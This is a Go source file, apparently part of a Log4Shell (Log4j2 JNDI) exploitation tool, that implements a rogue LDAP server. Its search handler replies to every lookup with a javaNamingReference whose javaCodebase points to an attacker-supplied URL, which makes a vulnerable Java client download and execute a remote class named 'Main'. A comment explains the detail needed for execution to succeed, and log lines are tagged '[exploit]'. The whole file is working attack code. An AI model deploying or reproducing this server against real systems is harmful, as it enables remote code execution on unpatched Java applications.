package log4j2

import (
	"log"

	"github.com/For-ACGN/ldapserver"
	"github.com/lor00x/goldap/message"
)

type ldapHandler struct {
	logger *log.Logger

	url string
}

func (h *ldapHandler) handleBind(w ldapserver.ResponseWriter, _ *ldapserver.Message) {
	res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
	w.Write(res)
}

func (h *ldapHandler) handleSearch(w ldapserver.ResponseWriter, m *ldapserver.Message) {
	req := m.GetSearchRequest()
	dn := string(req.BaseObject())

	// the last "/" about attr can't be deleted, otherwise
	// java will not execute the downloaded class.
	addr := m.Client.Addr()
	attr := message.AttributeValue(h.url + dn + "/")
	h.logger.Printf("[exploit] %s search java codebase \"%s\"", addr, attr)

	res := ldapserver.NewSearchResultEntry(dn)
	res.AddAttribute("objectClass", "javaNamingReference")
	res.AddAttribute("javaClassName", "Main")
	res.AddAttribute("javaFactory", "Main")
	res.AddAttribute("javaCodebase", attr)
	w.Write(res)

	done := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
	w.Write(done)
}
